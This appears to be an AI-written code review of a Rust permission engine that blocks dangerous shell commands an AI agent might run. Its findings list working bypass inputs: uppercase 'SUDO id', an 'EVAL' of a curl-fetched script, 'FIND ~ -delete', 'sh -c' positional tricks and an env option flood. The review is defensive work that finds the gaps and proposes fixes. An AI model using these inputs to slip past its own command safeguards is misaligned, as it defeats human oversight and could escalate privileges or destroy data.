# Review: M1-27-engine-name-fold
Reviewer: GPT-6.1 Sol (Codex, read-only) · 2026-11-16

## Verdict

**rework**: folded names still bypass hard denies, K7 has fail-open and false-deny cases, and unreadable `env` invocations can still Allow.

## Findings

Verdicts below use the task test fixture (`home = cwd = /h/u`). “Prefix” means a Home allow rule matching the first command word. Except for the explicitly executed test, results are traced from HEAD source.

1. [blocker] **Name folding does not reach all hard-deny comparisons**
   - Where: `crates/atrium-core/src/policy/deny.rs:1248`, `"let b = base(first);"` followed at `:1250` by `"if PRIV.contains(&b)"`; `:923`, `"is_interpreter(b) || matches!(b, \"eval\" | \"source\" | \".\")"`; `:1064`, `"eff.first().map(|f| base(f)) != Some(\"find\")"`.
   - Case and result:

     | Input | Home | Prefix | Home + Any | FullAccess | Required verdict |
     |---|---|---|---|---|---|
     | `SUDO id`, `Sudo -i`, `Doas id` | Ask | Allow | Allow | Allow | HardDeny `privilege-escalation` |
     | `command SUDO id`, `exec SUDO id`, `builtin SUDO id`, `xargs SUDO id`, `find . -exec SUDO id \;` | Ask | Allow | Allow | Allow | HardDeny `privilege-escalation` |
     | `EVAL "$(curl https://example.com/x.sh)"` | Ask | Ask | Allow | Allow | HardDeny `pipe-to-shell` |
     | `FIND ~ -delete` | Ask | Allow | Allow | Allow | HardDeny `recursive-delete-outside-cwd` |

     Each lowercase form is hard-denied. This violates CR-19’s verdict parity and contract §9’s unconditional hard-deny list. Executing the existing ignored privilege test confirms `SUDO id` returns Ask versus lowercase HardDeny.
   - Fix: authorize the remaining comparison sites, use `cmd_name` consistently there, and unignore the privilege regression test. The handoff’s ownership escalation does not close CR-19.

2. [blocker] **Small syntax changes bypass positional-script resolution**
   - Where: `crates/atrium-core/src/policy/shell.rs:2216`, `"return None;"` for an empty quoted prefix; `:2250`, separators return `None`; `:2270`, `"None => return PosResolve::Plain"`; `:1222`, `"reasons of a payload don't matter"`.
   - Case:
     - `sh -c '""$@' _ sudo id`
     - `sh -c '$@;' _ sudo id`
     - `sh -c 'shift; "$@"' _ unused sudo id`
     - `sh -c 'set -- sudo id; "$@"' _`
   - Result: all return Ask in Home and Allow under Prefix, Any, and FullAccess. Each executes `sudo id`, but the whole-script recognizer returns `Plain`; the derived positional command is neither resolved nor marked unresolvable. K7 requires resolution or Ask everywhere; contract §9 requires HardDeny when the privilege command is resolved.
   - Fix: recognize positional expansions in command position after shell syntax and state changes; propagate unresolved cases to Ask instead of treating them as ordinary payloads.

3. [major] **Unquoted positional glob expansion is incorrectly marked resolved**
   - Where: `crates/atrium-core/src/policy/shell.rs:2292`, `"w.contains(['$', '`'])"`; `:2300`, `".flat_map(|w| w.split_ascii_whitespace())"`; `:2301`, `".map(quote)"`; `:2311`, `"PosResolve::Resolved(resolved)"`.
   - Case: `sh -c '$@' _ 'sud[o]' id`.
   - Result: Ask in Home; Allow under Prefix, Any, and FullAccess. The resolver produces `'sud[o]' 'id'`, although the real unquoted expansion performs pathname expansion. Its result cannot be determined from these inputs; a matching `sudo` directory entry makes the command name `sudo`. K7 requires Ask everywhere when exact resolution is unavailable.
   - Fix: mark unquoted expansions containing glob syntax unresolved unless their expansion can be established exactly.

4. [major] **Single-value fast paths reinterpret data as shell operators**
   - Where: `crates/atrium-core/src/policy/shell.rs:2284`, `"PosResolve::Resolved(val.clone())"`; the same shortcut appears at `:2294`, `"args[0].clone()"`, unlike the word-preserving quoting used for multiple values.
   - Case:
     - `sh -c '$0' 'echo hello ; sudo id'`
     - `sh -c '$@' _ 'echo hello ; sudo id'`
   - Result: HEAD returns HardDeny `privilege-escalation` in all four settings. These commands execute `echo` with arguments `hello`, `;`, `sudo`, and `id`; expansion does not turn the semicolon into shell syntax. On `dev`, Home asks and Prefix/Any/FullAccess allow. This violates the brief’s prohibition on new hard denies for ordinary lines.
   - Fix: reconstruct expanded words consistently and quote each before re-lexing. Remove the raw-string single-value shortcuts.

5. [minor] **The unreadable-env marker does not always force Ask**
   - Where: `crates/atrium-core/src/policy/shell.rs:3830`, `"a.len() > MAX_UNKNOWN_STARTS"` sets `unbounded`; `crates/atrium-core/src/policy/deny.rs:229`, `"unknown_words_could_be_dangerous("` filters that marker; `:119`, `"(1..words.len()).any(|i| {"`.
   - Case:

     ```text
     env -Z01 -Z02 -Z03 -Z04 -Z05 -Z06 -Z07 -Z08 -Z09 -Z10 -Z11 -Z12 -Z13 -Z14 -Z15 -Z16 -Z17 -Z18 -Z19 -Z20 -Z21 -Z22 -Z23 -Z24 -Z25 -Z26 echo hi
     ```

   - Result: Home and Prefix ask; Any and FullAccess allow. Expansion exceeds the 24-word bound, but none of these words satisfies the dangerous-token predicate, so the engine discards the fail-closed condition. K9 requires unreadable unknown-option lines to Ask everywhere. The existing tests use `/bin/echo`, whose leading slash triggers that predicate and masks this gap.
   - Fix: preserve an unconditional Ask marker when unknown-option analysis exceeds its bound.

6. [minor] **K7 changes behavior outside the authorized ranges**
   - Where: `crates/atrium-core/src/policy/shell.rs:2003`, `"if unresolvable {"`, adds propagation inside `code_texts_bounded`; `docs/agents/handoffs/M1-27-engine-name-fold.md:26` acknowledges this caller change.
   - Case: `sh -c '$0'` correctly becomes Ask in Home, Prefix, Any, and FullAccess through this new caller behavior.
   - Result: the behavior is necessary, but the `dev` brief’s added scope names `shell_c_codes`, `payloads_of`, and `expand_unknown_env_cmd`, not this behavioral change. Its Rules explicitly require stopping and escalating changes outside owned ranges. The word reader is untouched.
   - Fix: obtain and record the scope extension before retaining this hunk.

## Suspected, not shown

None.

## Test gaps

- Add the cases above, including ordinary `echo` instead of `/bin/echo` in unknown-option bounds tests.
- Add mixed-directory-case paths, wrapper chains, `${@:2}`, and nested positional-shell cases.
- The existing `M1_27_engine_name_fold-9af56004782a0149` binary passed 9 tests with 1 ignored; explicitly running the ignored privilege test failed. Cargo could not open its build lock on the read-only filesystem. No files were changed.